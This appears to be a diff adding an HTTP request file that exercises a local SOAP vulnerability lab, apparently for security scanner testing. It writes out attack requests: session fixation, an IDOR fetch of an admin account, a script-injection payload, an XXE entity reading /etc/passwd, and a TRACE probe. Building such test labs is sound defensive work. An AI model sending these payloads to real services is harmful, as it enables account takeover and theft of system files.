@@ -1,0 +1,67 @@
+### Vulnerable WSDL
+GET http://127.0.0.1:8089/soap?wsdl
+
+### Vulnerable Login with session fixation
+POST http://127.0.0.1:8089/soap
+Content-Type: text/xml
+SOAPAction: Login
+X-Fixed-Session-Id: attacker-controlled-session
+
+<?xml version="1.0" encoding="UTF-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:lab="urn:soap-dast-lab">
+  <soap:Body>
+    <lab:Login>
+      <lab:Username>user_apollo</lab:Username>
+      <lab:Password>P6d@Xe1mRt$7</lab:Password>
+    </lab:Login>
+  </soap:Body>
+</soap:Envelope>
+
+### IDOR: user_apollo requesting admin account
+POST http://127.0.0.1:8089/soap
+Content-Type: text/xml
+SOAPAction: GetAccount
+Authorization: Bearer {{access_token}}
+
+<?xml version="1.0" encoding="UTF-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:lab="urn:soap-dast-lab">
+  <soap:Body>
+    <lab:GetAccount>
+      <lab:AccountId>9001</lab:AccountId>
+    </lab:GetAccount>
+  </soap:Body>
+</soap:Envelope>
+
+### Unsafe reflection
+POST http://127.0.0.1:8089/soap
+Content-Type: text/xml
+SOAPAction: SearchUser
+Authorization: Bearer {{access_token}}
+
+<?xml version="1.0" encoding="UTF-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:lab="urn:soap-dast-lab">
+  <soap:Body>
+    <lab:SearchUser>
+      <lab:Query><![CDATA["><script>alert(1)</script>]]></lab:Query>
+    </lab:SearchUser>
+  </soap:Body>
+</soap:Envelope>
+
+### DOCTYPE / ENTITY probe
+POST http://127.0.0.1:8089/soap
+Content-Type: text/xml
+SOAPAction: SearchUser
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:lab="urn:soap-dast-lab">
+  <soap:Body>
+    <lab:SearchUser>
+      <lab:Query>&xxe;</lab:Query>
+    </lab:SearchUser>
+  </soap:Body>
+</soap:Envelope>
+
+### TRACE reflection
+TRACE http://127.0.0.1:8089/verbs
+X-Probe: reflected-by-vulnerable-server
